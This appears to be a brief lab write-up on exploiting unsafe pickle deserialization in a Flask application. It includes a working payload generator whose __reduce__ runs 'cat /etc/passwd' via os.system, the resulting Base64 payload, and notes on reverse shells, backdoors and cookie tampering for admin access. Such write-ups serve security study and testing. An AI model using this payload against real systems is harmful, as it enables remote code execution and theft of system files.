# Exploitation Payloads and Scenarios

## Payload Used
To exploit the Flask application's unsafe `pickle.loads()` deserialization, we created a Python script that serializes a malicious class overriding the `__reduce__` method to execute `cat /etc/passwd`, encoded in Base64:

### 1. Payload Generator Script:
```python
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        cmd = "cat /etc/passwd"
        return (os.system, (cmd,))

serialized_data = pickle.dumps(RCE())
encoded_payload = base64.b64encode(serialized_data).decode()
print(encoded_payload)
gASVKgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjA9jYXQgL2V0Yy9wYXNzd2SUhZRSlC4=
Once submitted, the server deserializes the payload and executes the command, printing the /etc/passwd contents directly into the container logs (docker logs pro_01-flask_app-1).

Exploitation Scenarios
Remote Code Execution (RCE) & Full Server Takeover: An attacker can inject commands to open a reverse shell, read sensitive system/configuration files, or install persistent backdoors on the underlying server.

Privilege Escalation & Authentication Bypass: If serialized objects are used in cookies or tokens to store user session data, an attacker can tamper with object attributes (e.g., changing isAdmin = False to isAdmin = True) to gain unauthorized administrative privileges.
